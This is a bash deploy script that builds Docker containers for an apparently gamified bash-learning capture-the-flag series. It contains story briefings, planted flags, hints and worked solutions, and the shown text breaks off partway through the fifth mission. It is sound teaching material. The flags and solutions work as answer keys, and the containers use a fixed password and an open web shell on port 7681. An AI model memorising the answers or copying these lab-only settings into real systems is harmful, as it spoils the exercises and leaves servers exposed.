#!/bin/bash
# =============================================================================
# Season 2 "The Syndicate" — VPS Mission Deploy Script
# Run on the VPS: bash deploy-s2-missions.sh
# =============================================================================
set -euo pipefail

MISSIONS_DIR="/root/vps/missions"
mkdir -p "$MISSIONS_DIR"

# =============================================================================
# S2-MISSION-01: Boot Protocol
# Story: VECTOR's calling card. The Syndicate announces their return.
# Skills: variables, env, chmod +x, command substitution
# =============================================================================
mkdir -p "$MISSIONS_DIR/s2-mission-01"
cat > "$MISSIONS_DIR/s2-mission-01/Dockerfile" << 'DOCKERFILE'
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq wget bash less 2>/dev/null && \
    rm -rf /var/lib/apt/lists/*
RUN wget -qO /usr/local/bin/ttyd \
    https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64 && \
    chmod +x /usr/local/bin/ttyd

RUN useradd -m -s /bin/bash agent && echo 'agent:lab' | chpasswd
RUN mkdir -p /home/agent/inbox /home/agent/hints

# ── Story: README / mission briefing ──
RUN cat > /home/agent/README.txt << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║  SEASON 2 — THE SYNDICATE                                   ║
║  S2-01: Boot Protocol                  [ DIFFICULTY: EASY ] ║
╚══════════════════════════════════════════════════════════════╝

FROM:    Shyft <president@thelab.local>
TO:      Agent
SUBJECT: They're back.

Six months. We patched every hole. Rotated every key.
Audited every dependency. We thought it was over.

At 03:14 this morning, every system in The Lab rebooted
simultaneously. We didn't schedule that.

VECTOR left something behind — a message in the environment,
an executable we didn't write, and a note in your inbox.
They're not even hiding. They want us to know they're back.

This time it's different. The attack is automated. It
generates evidence faster than any human can read it.
Manual investigation won't be fast enough anymore.

You need to learn to script. Automate everything.
We're not fighting a person. We're fighting a machine.

                                        — Shyft // President

──────────────────────────────────────────────────────────────
  INBOX:  cat ~/inbox/shyft_01.txt     (full briefing)
          cat ~/inbox/vector_01.txt    (VECTOR's calling card)
  HINTS:  ~/hints/

──────────────────────────────────────────────────────────────
OBJECTIVES
  [ ] Flag 1: It's in this file. Read carefully.
              flag{s2_boot_protocol_active}

  [ ] Flag 2: VECTOR left a message in the environment.
              Try: env | grep SYNDICATE
              Or:  printenv | grep -i note

  [ ] Flag 3: An unknown executable was planted at boot.
              Make it runnable and execute it.
              Try: ls -la ~/unlock.sh
                   chmod +x ~/unlock.sh && ./unlock.sh
EOF

# ── Inbox ──
RUN cat > /home/agent/inbox/shyft_01.txt << 'EOF'
FROM:    Shyft <president@thelab.local>
TO:      Agent
DATE:    2026-05-17 03:47:12
SUBJECT: URGENT — Boot anomaly detected

I know it's early. I'm sorry.

Every machine in the building rebooted at 03:14. Simultaneously.
UPS logs show no power event. Network logs show no remote reboot command.
The systems came back up healthy — which is somehow more unsettling.

Moon Captain found a file in the boot environment that nobody
recognizes. It's executable but locked. 0xb007ab1e checked the
git history — it was never committed. It just appeared.

CritterCodes is pulling the process logs now. My gut says this
is The Syndicate. They've been quiet since Nemesis. Too quiet.

I need you on this. Start with the environment — VECTOR has a
habit of leaving fingerprints in env vars from Season 1.
Check what's loaded in your current session.

Then find that mystery executable and run it. Let's see
what they wanted us to find.

Stay sharp.
                                             — Shyft
EOF

RUN cat > /home/agent/inbox/vector_01.txt << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║  VECTOR // SYNDICATE AUTONOMOUS SYSTEM  v2.1.0              ║
║  TRANSMISSION PRIORITY: ALPHA                               ║
║  RECIPIENT: THE LAB — ALL PERSONNEL                         ║
╚══════════════════════════════════════════════════════════════╝

Season 2 begins.

Your patches were documented.
Your key rotations were anticipated.
Your dependency audits were catalogued and circumvented.

We did not attack your systems last night.
We improved them — for our purposes.

The environment variable you are about to find was a
courtesy. A demonstration of access depth.
We have been resident since your last reboot.

You cannot investigate fast enough manually.
We generate 50,000 events per hour.
You read at approximately 200 lines per minute.

The math is not in your favor.

Adapt, or lose everything.

                    — VECTOR
                      Syndicate Autonomous Attack Coordinator
                      [TRANSMISSION ORIGIN: REDACTED]
EOF

# ── Flag 2: env var ──
RUN echo 'export SYNDICATE_NOTE="flag{s2_environment_compromised}"' >> /etc/bash.bashrc

# ── Flag 3: locked executable planted at "boot" ──
RUN cat > /home/agent/unlock.sh << 'EOF'
#!/bin/bash
# VECTOR planted this. Make it executable and run it.
# What does it actually do?
AGENT=$(whoami)
UPTIME=$(uptime -p)
echo ""
echo "[ BOOT SEQUENCE AUTHENTICATED ]"
echo "  Agent   : $AGENT"
echo "  Host    : $(hostname)"
echo "  Uptime  : $UPTIME"
echo "  Shell   : $SHELL"
echo ""
echo "  VECTOR footprint confirmed in boot sequence."
echo "  Authorization token: flag{s2_execute_permission_granted}"
echo ""
echo "  NOTE: This executable was placed here by VECTOR."
echo "  It authenticated your identity to their system."
echo "  You've been logged. Welcome to the game."
EOF
RUN chmod 644 /home/agent/unlock.sh

# ── Hints ──
RUN cat > /home/agent/hints/variables.txt << 'EOF'
── BASH VARIABLES ──────────────────────────────────────────
NAME="agent"
echo "Hello, $NAME"
echo "Home: $HOME   User: $USER   Shell: $SHELL"

# Command substitution — run a command, use its output
TODAY=$(date +%Y-%m-%d)
FILES=$(ls | wc -l)
echo "Today: $TODAY, Files: $FILES"

# Reading environment variables
env                      # list everything
printenv VAR_NAME        # read one variable
echo $SYNDICATE_NOTE     # direct read
env | grep SYNDICATE     # filter

── CHMOD ────────────────────────────────────────────────────
ls -la file.sh           # check permissions (-rwxr-xr-x)
chmod +x file.sh         # add execute for everyone
chmod 755 file.sh        # rwxr-xr-x  (same as above)
./file.sh                # run it (needs execute permission)
EOF

RUN echo 'echo ""; cat ~/README.txt; echo ""' >> /home/agent/.bashrc
RUN chown -R agent:agent /home/agent
WORKDIR /home/agent
USER agent
ENTRYPOINT ["ttyd", "-W", "-p", "7681", "bash"]
DOCKERFILE

# =============================================================================
# S2-MISSION-02: Log Flood
# Story: VECTOR's denial-of-investigation attack. Moon Captain needs automation.
# Skills: grep, awk, sed, base64, tr ROT13, pipelines
# =============================================================================
mkdir -p "$MISSIONS_DIR/s2-mission-02"
cat > "$MISSIONS_DIR/s2-mission-02/Dockerfile" << 'DOCKERFILE'
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq wget bash gawk sed python3 2>/dev/null && \
    rm -rf /var/lib/apt/lists/*
RUN wget -qO /usr/local/bin/ttyd \
    https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64 && \
    chmod +x /usr/local/bin/ttyd

RUN useradd -m -s /bin/bash agent && echo 'agent:lab' | chpasswd
RUN mkdir -p /home/agent/inbox /home/agent/hints /home/agent/workspace \
             /var/log/syndicate

# ── Generate logs ──
RUN python3 -c "
import base64, random, codecs
random.seed(42)

# access.log: flag 1 hidden as base64 comment in 500 lines
flag1_b64 = base64.b64encode(b'flag{s2_grep_in_the_dark}').decode()
ips = ['10.0.0.'+str(i) for i in range(1,20)]
paths = ['/index.html','/login','/api/v1/users','/admin','/static/app.js','/dashboard']
methods = ['GET','POST','PUT','DELETE']
codes = ['200','200','200','301','404','403','500']
lines = []
for i in range(499):
    ip = random.choice(ips)
    m = random.choice(methods)
    p = random.choice(paths)
    c = random.choice(codes)
    lines.append(f'{ip} - - [17/May/2026:10:{i//60:02d}:{i%60:02d} +0000] \"{m} {p} HTTP/1.1\" {c} {random.randint(100,9999)}')
lines.insert(237, f'# DIAGNOSTIC: {flag1_b64}')
with open('/var/log/syndicate/access.log','w') as f:
    f.write('\n'.join(lines))

# events.csv: flag 2 in 6th field of BREACH line
rows = ['timestamp,source_ip,event_type,user,severity,detail']
events = ['LOGIN','LOGOUT','SCAN','TRANSFER','ALERT']
for i in range(498):
    ts = f'2026-05-17T10:{i//60:02d}:{i%60:02d}Z'
    ip = '10.0.0.' + str(random.randint(1,20))
    ev = random.choice(events)
    u = random.choice(['root','agent','guest','admin','svc'])
    sev = random.choice(['LOW','MED','HIGH'])
    rows.append(f'{ts},{ip},{ev},{u},{sev},noise_{i}')
rows.insert(312, '2026-05-17T15:42:00Z,10.0.0.99,BREACH,VECTOR_BOT,CRITICAL,flag{s2_awk_field_extracted}')
with open('/var/log/syndicate/events.csv','w') as f:
    f.write('\n'.join(rows))

# comms.enc: flag 3 ROT13
rot13 = codecs.encode('flag{s2_rot13_comms_decoded}', 'rot_13')
with open('/var/log/syndicate/comms.enc','w') as f:
    f.write('BEGIN VECTOR TRANSMISSION\nENCODING: ROT13\nPRIORITY: ALPHA\n\n')
    f.write(rot13 + '\n\nEND TRANSMISSION\n')
print('logs generated')
"

# ── Story: README ──
RUN cat > /home/agent/README.txt << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║  SEASON 2 — THE SYNDICATE                                   ║
║  S2-02: Log Flood                      [ DIFFICULTY: EASY ] ║
╚══════════════════════════════════════════════════════════════╝

FROM:    Moon Captain <secretary@thelab.local>
TO:      Agent
SUBJECT: I can't read this manually. I need a script.

VECTOR generated 50,000 log entries in the three hours after
the boot anomaly. Three hours. That's not an accident —
it's a denial-of-investigation attack. They're burying
their real activity under an avalanche of noise.

I found three files in /var/log/syndicate/ that were
created during the flood window. At least one of them
has real Syndicate data hidden inside the noise.

I've been staring at access.log for forty minutes.
Line 237 out of 500 has something that doesn't look
like a normal log entry — but I can't grep fast enough
to find the pattern across all three files.

You need to script this. grep, awk, sed — whatever it
takes to cut through the noise.

                                    — Moon Captain // Secretary

──────────────────────────────────────────────────────────────
  INBOX:  cat ~/inbox/mooncaptain_01.txt
          cat ~/inbox/crittercodes_01.txt
  LOGS:   /var/log/syndicate/

──────────────────────────────────────────────────────────────
OBJECTIVES
  [ ] Flag 1: access.log contains a base64-encoded line
              hidden among 500 lines of noise.
              Decode it to get the flag.
              Try: grep '# DIAGNOSTIC' /var/log/syndicate/access.log
                   base64 -d <<< "<the encoded string>"

  [ ] Flag 2: events.csv — find the BREACH event.
              The flag is in the 6th comma-delimited field.
              Try: awk -F, '/BREACH/ {print $6}' /var/log/syndicate/events.csv

  [ ] Flag 3: comms.enc is a ROT13-encoded VECTOR transmission.
              Decode it.
              Try: cat /var/log/syndicate/comms.enc | tr 'A-Za-z' 'N-ZA-Mn-za-m'

  WORKSPACE: ~/workspace/ — write your scripts here
EOF

# ── Inbox ──
RUN cat > /home/agent/inbox/mooncaptain_01.txt << 'EOF'
FROM:    Moon Captain <secretary@thelab.local>
TO:      Agent
DATE:    2026-05-17 06:12:44
SUBJECT: Log flood — need automation NOW

Three files appeared in /var/log/syndicate/ during the boot
window. I know VECTOR put them there.

access.log   — 500 lines. Something's hidden in there.
events.csv   — comma-separated. One line doesn't fit.
comms.enc    — this one isn't even pretending to be a log.
               It's a transmission. Encoded, but not well.

I tried reading access.log manually. I got to line 80 before
my eyes crossed. There are 500 lines. We don't have time
for this to be a reading exercise.

Write a script. grep for anomalies. Use awk to pull fields
from the CSV. tr to decode the comms file — I think it's ROT13.

VECTOR made this noisy on purpose. Don't let the noise win.

                                         — Moon Captain
EOF

RUN cat > /home/agent/inbox/crittercodes_01.txt << 'EOF'
FROM:    CritterCodes <ceo@thelab.local>
TO:      Agent
DATE:    2026-05-17 06:31:09
SUBJECT: RE: Log flood

Moon Captain is right. This is a deliberate tactic.

VECTOR's playbook: generate so much data that human
investigators can't parse it in time. By the time you
manually read through 50,000 log lines, VECTOR has
already moved on to the next phase of the attack.

The only counter is automation. Write scripts that
can parse all three files in seconds, not hours.

Also — I checked the events.csv timestamps. The BREACH
event happened at 15:42:00. Right in the middle of our
open hours, when we'd be most distracted. These aren't
random bots. VECTOR has studied us.

                                        — CritterCodes // CEO
EOF

# ── Hints ──
RUN cat > /home/agent/hints/text_tools.txt << 'EOF'
── grep ─────────────────────────────────────────────────────
grep "pattern" file              # search for pattern
grep -n "pattern" file           # show line numbers
grep -r "pattern" /dir/          # recursive
grep -v "pattern" file           # lines NOT matching

── awk ──────────────────────────────────────────────────────
awk '{print $1}' file            # 1st whitespace field
awk -F, '{print $3}' file        # comma-delimited 3rd field
awk -F, '/PATTERN/ {print $6}'   # match pattern, print field 6

── sed ──────────────────────────────────────────────────────
sed 's/old/new/g' file           # replace all
sed -n '10,20p' file             # print lines 10-20

── tr ───────────────────────────────────────────────────────
tr 'A-Za-z' 'N-ZA-Mn-za-m'      # ROT13 decode/encode
tr '[:upper:]' '[:lower:]'       # lowercase
tr -d '\n'                       # strip newlines

── base64 ───────────────────────────────────────────────────
echo "aGVsbG8=" | base64 -d      # decode inline
base64 -d <<< "aGVsbG8="         # same thing, herestring
cat file | base64 -d             # decode a file
EOF

RUN echo 'echo ""; cat ~/README.txt; echo ""' >> /home/agent/.bashrc
RUN chown -R agent:agent /home/agent
WORKDIR /home/agent
USER agent
ENTRYPOINT ["ttyd", "-W", "-p", "7681", "bash"]
DOCKERFILE

# =============================================================================
# S2-MISSION-03: Fragment Recovery
# Story: VECTOR shredded its own evidence trails. 0xb007ab1e asks for help.
# Skills: for loops, while read, find, seq, globbing
# =============================================================================
mkdir -p "$MISSIONS_DIR/s2-mission-03"
cat > "$MISSIONS_DIR/s2-mission-03/Dockerfile" << 'DOCKERFILE'
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq wget bash python3 findutils 2>/dev/null && \
    rm -rf /var/lib/apt/lists/*
RUN wget -qO /usr/local/bin/ttyd \
    https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64 && \
    chmod +x /usr/local/bin/ttyd

RUN useradd -m -s /bin/bash agent && echo 'agent:lab' | chpasswd
RUN mkdir -p /home/agent/inbox /home/agent/hints /home/agent/workspace

# ── Generate fragments ──
RUN python3 -c "
import os
os.makedirs('/home/agent/fragments', exist_ok=True)
for i in range(1, 101):
    fname = f'/home/agent/fragments/fragment_{i:03d}.txt'
    if i == 42:
        content = ('SYNDICATE EVIDENCE FRAGMENT 042\n'
                   'Classification: TOP SECRET\n'
                   'Origin: VECTOR automated exfil log\n'
                   'Content: flag{s2_fragment_042_found}\n'
                   'Context: partial agent roster — 3 of 12 names visible\n'
                   'Cross-reference: comms intercept batch 7, timestamp 15:42\n')
    else:
        content = (f'SYNDICATE NOISE FRAGMENT {i:03d}\n'
                   f'Classification: ROUTINE\n'
                   f'Content: [REDACTED — noise payload {i * 7919 % 9973}]\n'
                   f'This fragment contains no actionable intelligence.\n')
    with open(fname, 'w') as f:
        f.write(content)
print('fragments done')
"

# ── data.txt for while-read loop (flag on line 13) ──
RUN python3 -c "
lines = []
for i in range(1, 51):
    if i == 13:
        lines.append(f'ENTRY {i:02d}: flag{{s2_while_loop_unlocked}} — VECTOR heartbeat timestamp')
    else:
        lines.append(f'ENTRY {i:02d}: heartbeat_{i}_nominal — no anomaly')
with open('/home/agent/data.txt', 'w') as f:
    f.write('\n'.join(lines))
print('data.txt done')
"

# ── Hidden .syndicate file (flag 3) ──
RUN mkdir -p /opt/syndicate/cache/deep/archive && \
    echo 'flag{s2_find_syndicate_cache}' \
    > /opt/syndicate/cache/deep/archive/evidence.syndicate

# ── Story: README ──
RUN cat > /home/agent/README.txt << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║  SEASON 2 — THE SYNDICATE                                   ║
║  S2-03: Fragment Recovery              [ DIFFICULTY: EASY ] ║
╚══════════════════════════════════════════════════════════════╝

FROM:    0xb007ab1e <treasurer@thelab.local>
TO:      Agent
SUBJECT: They learned from Nemesis. No clean trail this time.

I've been studying VECTOR's behavior since the boot incident.
During Season 1, Project Nemesis left clean files we could
read and trace. VECTOR is smarter. It shredded its own
evidence — split it into 100 fragments and scattered them
across the filesystem, most of them decoys.

One of those 100 fragments in ~/fragments/ is real.
The rest are noise. I can't tell which one by looking.
You need to loop through all of them and search for the flag.

I also found something in data.txt — 50 heartbeat entries,
one of which is a VECTOR timestamp. Line 13. You'll need
a while-read loop with a counter to pull it without
loading the whole file.

And there's a .syndicate cache file hidden somewhere deeper
on the system. VECTOR uses that extension for persistent
storage. find will locate it — nothing stays hidden from find.

I owe The Lab for what happened in Season 1.
Let me help you bring these people down.

                                    — 0xb007ab1e // Treasurer

──────────────────────────────────────────────────────────────
  INBOX:  cat ~/inbox/0xb007ab1e_01.txt
          cat ~/inbox/shyft_02.txt
──────────────────────────────────────────────────────────────
OBJECTIVES
  [ ] Flag 1: One of the 100 files in ~/fragments/ is real.
              Loop through them to find it.
              Try: for f in fragments/*.txt; do grep -l "flag{" "$f"; done

  [ ] Flag 2: ~/data.txt has 50 lines. Flag is on line 13.
              Use a while-read loop with a counter.
              Try: count=0
                   while IFS= read -r line; do
                     ((count++))
                     [ $count -eq 13 ] && echo "$line"
                   done < data.txt

  [ ] Flag 3: A .syndicate file is hidden somewhere.
              find can locate any file by extension.
              Try: find / -name "*.syndicate" 2>/dev/null
EOF

# ── Inbox ──
RUN cat > /home/agent/inbox/0xb007ab1e_01.txt << 'EOF'
FROM:    0xb007ab1e <treasurer@thelab.local>
TO:      Agent
DATE:    2026-05-17 08:03:55
SUBJECT: Fragment analysis — what I found

I ran some manual analysis overnight. VECTOR's fragmentation
pattern is designed to waste analyst time. 99 decoys, 1 real.

The real fragment is buried in position 042 of the sequence.
I'd tell you to just cat fragment_042.txt — but that's
exactly what VECTOR expects. They may have changed the order.
Write the loop. Verify programmatically.

More importantly: I found VECTOR's cache directory during my
search. It used the .syndicate extension — easy to miss if
you don't know to look for it. find with -name "*.syndicate"
will surface it instantly. The cache contains persistent
Syndicate storage — what they're keeping between sessions.

The data.txt file is a VECTOR heartbeat log. 50 entries,
one anomaly. Line 13 has a timestamp that doesn't fit
the pattern. A counter-based while-read loop will find it.

I know how to spot VECTOR's patterns now.
I'm not going to let Season 1 happen again.

                                         — 0xb007ab1e
EOF

RUN cat > /home/agent/inbox/shyft_02.txt << 'EOF'
FROM:    Shyft <president@thelab.local>
TO:      Agent
DATE:    2026-05-17 08:47:22
SUBJECT: Good work on the logs. Next step.

Moon Captain tells me you decoded the log files.
That's exactly the kind of speed we need.

0xb007ab1e has been pulling all-nighters since the incident.
They feel responsible — don't tell them I said that.
But their fragment analysis is solid. Trust it.

Three objectives this mission:
  - Fragment loop (don't manual-search 100 files)
  - data.txt counter (line 13)
  - .syndicate cache (find it)

VECTOR is building something. These fragments are pieces
of an agent roster. We need to know who The Syndicate has
deployed in the physical world. Fragment 042 is a start.

                                             — Shyft
EOF

# ── Hints ──
RUN cat > /home/agent/hints/loops.txt << 'EOF'
── FOR LOOP ─────────────────────────────────────────────────
for f in fragments/*.txt; do
    echo "Checking: $f"
    grep "flag{" "$f" && echo "FOUND: $f"
done

# grep -l only prints filename (not the matching line)
for f in fragments/*.txt; do grep -l "flag{" "$f"; done

# seq-based loop
for i in $(seq 1 100); do echo "Number: $i"; done

── WHILE READ LOOP ──────────────────────────────────────────
count=0
while IFS= read -r line; do
    ((count++))
    if [ $count -eq 13 ]; then
        echo "Line 13: $line"
        break    # stop once found
    fi
done < data.txt

── FIND ─────────────────────────────────────────────────────
find / -name "*.syndicate" 2>/dev/null     # by extension
find / -name "secret*" 2>/dev/null         # by name prefix
find /home -type f                         # files only
find / -mmin -60 2>/dev/null              # modified last 60 min
EOF

RUN echo 'echo ""; cat ~/README.txt; echo ""' >> /home/agent/.bashrc
RUN chown -R agent:agent /home/agent
WORKDIR /home/agent
USER agent
ENTRYPOINT ["ttyd", "-W", "-p", "7681", "bash"]
DOCKERFILE

# =============================================================================
# S2-MISSION-04: Debug Protocol
# Story: VECTOR corrupted The Lab's own tools — supply chain attack.
# Skills: bash functions, local vars, return vs exit, set -x, shellcheck
# =============================================================================
mkdir -p "$MISSIONS_DIR/s2-mission-04"
cat > "$MISSIONS_DIR/s2-mission-04/Dockerfile" << 'DOCKERFILE'
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq wget bash shellcheck 2>/dev/null && \
    rm -rf /var/lib/apt/lists/*
RUN wget -qO /usr/local/bin/ttyd \
    https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64 && \
    chmod +x /usr/local/bin/ttyd

RUN useradd -m -s /bin/bash agent && echo 'agent:lab' | chpasswd
RUN mkdir -p /home/agent/inbox /home/agent/hints /home/agent/debug

# ── Buggy scripts ──

# Script 1: missing 'local' — variable scope bug
RUN cat > /home/agent/debug/script1.sh << 'EOF'
#!/bin/bash
# VECTOR sabotaged this script by removing the 'local' keyword.
# Without it, the function bleeds into global scope.
# Fix: add 'local' before the 'result' variable inside decode_flag().

decode_flag() {
    # BUG: 'result' should be 'local result'
    result="flag{s2_scope_bug_squashed}"
    echo "$result"
}

result="this_must_not_change"
decoded=$(decode_flag)
echo "Decoded: $decoded"

if [ "$result" = "this_must_not_change" ]; then
    echo "[PASS] Scope clean. Flag: $decoded"
else
    echo "[FAIL] Scope leaked — result was overwritten."
    echo "       Add 'local' before the variable inside the function."
fi
EOF
RUN chmod +x /home/agent/debug/script1.sh

# Script 2: exit vs return bug
RUN cat > /home/agent/debug/script2.sh << 'EOF'
#!/bin/bash
# VECTOR replaced 'return 1' with 'exit 1' inside this function.
# That means a failed validation kills the ENTIRE script
# instead of just returning an error code to the caller.
# Fix: change 'exit 1' to 'return 1' inside validate_token().

validate_token() {
    local token="$1"
    if [ ${#token} -lt 8 ]; then
        echo "Token too short."
        exit 1   # BUG: should be 'return 1'
    fi
    echo "Token valid."
    return 0
}

echo "Testing short token..."
validate_token "abc"
# If 'exit' is fixed to 'return', execution continues here:
echo "Script survived the function call."
echo "Flag: flag{s2_return_code_fixed}"
EOF
RUN chmod +x /home/agent/debug/script2.sh

# Script 3: hyphenated function name + missing closing brace
RUN cat > /home/agent/debug/script3.sh << 'EOF'
#!/bin/bash
# VECTOR introduced two syntax errors:
# Error 1: function name uses a hyphen (invalid — use underscores)
# Error 2: missing closing brace '}' for the function body
# Fix both and run the script.

# BUG: hyphen in function name is invalid bash
analyze-evidence() {
    local target="$1"
    echo "Analyzing target: $target"
    echo "VECTOR signature confirmed."
    echo "Flag: flag{s2_syntax_error_patched}"
# BUG: missing closing brace here

analyze-evidence "syndicate_c2_107.172.140.240"
EOF
RUN chmod +x /home/agent/debug/script3.sh

# ── Story: README ──
RUN cat > /home/agent/README.txt << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║  SEASON 2 — THE SYNDICATE                                   ║
║  S2-04: Debug Protocol               [ DIFFICULTY: MEDIUM ] ║
╚══════════════════════════════════════════════════════════════╝

FROM:    CritterCodes <ceo@thelab.local>
TO:      Agent
SUBJECT: They got into our toolchain.

While you were working on the log flood, VECTOR pulled
something we didn't expect — a supply chain attack on
our own investigation scripts.

Three bash scripts in ~/debug/ were modified through the
same boot vulnerability VECTOR exploited on Day 1. The
bugs are subtle. A missing keyword here, a wrong function
call there. Professional work. They knew exactly what
our scripts do because they've been watching us use them.

This is the part that scares me: VECTOR isn't just
attacking our infrastructure. It's attacking our ability
to fight back. If our investigation tools are broken and
we don't notice, we're blind.

Find the bugs. Fix them. Run each script — a passing
script prints its own flag.

bash -n script.sh    — syntax check without running
bash -x script.sh    — trace mode (shows every command)
shellcheck script.sh — full lint pass

                                        — CritterCodes // CEO

──────────────────────────────────────────────────────────────
  INBOX:  cat ~/inbox/crittercodes_02.txt
          cat ~/inbox/mooncaptain_02.txt
──────────────────────────────────────────────────────────────
OBJECTIVES
  [ ] Flag 1: ~/debug/script1.sh — variable scope bug
              Fix: add 'local' keyword inside decode_flag()
              Run: bash debug/script1.sh

  [ ] Flag 2: ~/debug/script2.sh — exit vs return bug
              Fix: change 'exit 1' to 'return 1' inside validate_token()
              Run: bash debug/script2.sh

  [ ] Flag 3: ~/debug/script3.sh — two syntax errors
              Fix 1: rename function (no hyphens — use underscores)
              Fix 2: add the missing closing brace '}'
              Run: bash debug/script3.sh
EOF

# ── Inbox ──
RUN cat > /home/agent/inbox/crittercodes_02.txt << 'EOF'
FROM:    CritterCodes <ceo@thelab.local>
TO:      Agent
DATE:    2026-05-17 10:15:03
SUBJECT: Supply chain attack — details

I reverse-engineered how VECTOR modified the scripts.
During the boot window, VECTOR had write access to /home/agent.
It made surgical edits — not random corruption, not deletion.
It removed a single keyword from script1. Swapped one word
in script2. Added a typo and removed a brace from script3.

The goal wasn't to break the scripts obviously. It was to
make them fail silently or behave incorrectly in ways we
might not catch until it was too late.

script1: decode_flag() modifies a global variable when it
         should be using a local one. The decoded value
         still comes out — but so does the scope corruption.
         Add 'local' before the 'result' assignment.

script2: validate_token() calls 'exit' instead of 'return'
         when validation fails. That kills the whole script
         instead of returning an error code to the caller.

script3: Two issues — function names cannot contain hyphens
         in bash. And the function body is missing its
         closing brace. bash -n will catch both of these.

                                         — CritterCodes
EOF

RUN cat > /home/agent/inbox/mooncaptain_02.txt << 'EOF'
FROM:    Moon Captain <secretary@thelab.local>
TO:      Agent
DATE:    2026-05-17 10:52:17
SUBJECT: Something to think about

VECTOR knew which scripts to sabotage.
VECTOR knew what the scripts do.
VECTOR made changes designed to be hard to spot.

That level of familiarity doesn't come from network scanning.
Something has been watching us for longer than we thought.

I don't want to alarm anyone. But when you fix these scripts
and get the flags — consider what VECTOR already knows.

                                         — Moon Captain
EOF

# ── Hints ──
RUN cat > /home/agent/hints/functions.txt << 'EOF'
── BASH FUNCTIONS ───────────────────────────────────────────
my_function() {
    local my_var="only visible inside"   # local scope
    echo "result: $my_var"
    return 0    # 0=success, non-zero=failure
}
result=$(my_function)   # capture output
echo "Exit code: $?"    # last return code

── KEY RULES ────────────────────────────────────────────────
1. 'local' keeps variables inside the function.
   Without it, you overwrite global variables.

2. 'return N' exits a function. 'exit N' exits the script.
   Always use 'return' inside functions.

3. Function names: letters, digits, underscores only.
   'my-func' is invalid. 'my_func' is correct.

4. Every function body needs an opening { and closing }.

── DEBUGGING ────────────────────────────────────────────────
bash -n script.sh      # syntax check (no execution)
bash -x script.sh      # trace: shows each command as run
shellcheck script.sh   # comprehensive lint
set -x                 # enable trace inside a running script
set +x                 # disable trace
EOF

RUN echo 'echo ""; cat ~/README.txt; echo ""' >> /home/agent/.bashrc
RUN chown -R agent:agent /home/agent
WORKDIR /home/agent
USER agent
ENTRYPOINT ["ttyd", "-W", "-p", "7681", "bash"]
DOCKERFILE

# =============================================================================
# S2-MISSION-05: Signal Intelligence
# Story: Three intercepted VECTOR transmissions. Decoded messages reveal the target.
# Skills: sed -E, awk -F, tr, rev, chained pipes
# =============================================================================
mkdir -p "$MISSIONS_DIR/s2-mission-05"
cat > "$MISSIONS_DIR/s2-mission-05/Dockerfile" << 'DOCKERFILE'
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq wget bash gawk sed python3 2>/dev/null && \
    rm -rf /var/lib/apt/lists/*
RUN wget -qO /usr/local/bin/ttyd \
    https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64 && \
    chmod +x /usr/local/bin/ttyd

RUN useradd -m -s /bin/bash agent && echo 'agent:lab' | chpasswd
RUN mkdir -p /home/agent/inbox /home/agent/hints /home/agent/comms

# ── Encoded transmissions ──

# message_01.enc: rev then ROT13
RUN python3 -c "
import codecs
flag = 'flag{s2_rev_rot13_decoded}'
rot13 = codecs.encode(flag, 'rot_13')
reversed_str = rot13[::-1]
with open('/home/agent/comms/message_01.enc','w') as f:
    f.write('VECTOR CHANNEL ALPHA — ENCODED\n')
    f.write('TRANSFORM: REVERSE then ROT13\n')
    f.write('TO DECODE: reverse the payload line, then apply ROT13\n\n')
    f.write('PAYLOAD:\n')
    f.write(reversed_str + '\n')
print('message_01 ready. Payload:', reversed_str)
"

# message_02.csv: flag assembled from fields 2, 4, 6
RUN cat > /home/agent/comms/message_02.csv << 'EOF'
record_type,part_a,noise_1,part_b,noise_2,part_c,timestamp
HEADER,_IGNORE_,alpha,_IGNORE_,beta,_IGNORE_,2026-05-17T00:00:00Z
NOISE,_IGNORE_,zeta,_IGNORE_,eta,_IGNORE_,2026-05-17T01:00:00Z
NOISE,_IGNORE_,theta,_IGNORE_,iota,_IGNORE_,2026-05-17T02:00:00Z
SYNDICATE_PAYLOAD,flag{s2,kappa,_awk_fields,lambda,_assembled},2026-05-17T03:00:00Z
NOISE,_IGNORE_,mu,_IGNORE_,nu,_IGNORE_,2026-05-17T04:00:00Z
EOF

# message_03.enc: sed substitution
RUN cat > /home/agent/comms/message_03.enc << 'EOF'
VECTOR CHANNEL GAMMA — SED ENCODED
TARGET: THE LAB EQUIPMENT DESIGN ARCHIVE
EXTRACTION WINDOW: 2026-05-20 02:00 UTC

ENCODED AUTHORIZATION TOKEN:
SYNDICATE_s2_sed_substitution_done_END

DECODE INSTRUCTION:
  sed 's/SYNDICATE_/flag{s2_/; s/_END/}/' message_03.enc | grep "flag{"

MISSION CONTEXT:
  If this token is decoded, the equipment archive extraction
  is scheduled. The Lab has 72 hours before the exfil window.
EOF

# ── Story: README ──
RUN cat > /home/agent/README.txt << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║  SEASON 2 — THE SYNDICATE                                   ║
║  S2-05: Signal Intelligence          [ DIFFICULTY: MEDIUM ] ║
╚══════════════════════════════════════════════════════════════╝

FROM:    Moon Captain <secretary@thelab.local>
TO:      Agent
SUBJECT: Three transmissions. I need your eyes on these.

I've been monitoring VECTOR's external communications since
the boot incident. Last night I intercepted three transmissions
sent between Syndicate nodes. They're encoded — not heavily,
but enough to need the right tools.

What I can tell already: message_03 mentions a target.
Something about an extraction window in 72 hours.
If I'm reading this right, VECTOR is planning to exfiltrate
The Lab's equipment design archive. That's years of member
work — 3D models, laser cutter files, PCB designs, everything.

I need all three decoded. The third one especially.

                                    — Moon Captain // Secretary

──────────────────────────────────────────────────────────────
  INBOX:  cat ~/inbox/mooncaptain_03.txt
          cat ~/inbox/vector_02.txt     (intercepted)
  COMMS:  ~/comms/
──────────────────────────────────────────────────────────────
